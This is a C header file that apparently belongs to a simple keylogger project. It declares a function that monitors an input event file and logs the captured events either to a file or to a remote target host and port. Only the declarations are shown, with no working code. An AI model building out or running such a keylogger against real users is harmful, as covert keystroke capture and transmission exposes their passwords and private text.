#ifndef C_SIMPLE_KEYLOGGER_EVENT_MONITOR_H
#define C_SIMPLE_KEYLOGGER_EVENT_MONITOR_H

#define NETWORK_LOG 1
#define FILE_LOG 2

_Noreturn void monitor_event(const char *event_file, int flag, const char *target, int port);

#endif //C_SIMPLE_KEYLOGGER_EVENT_MONITOR_H
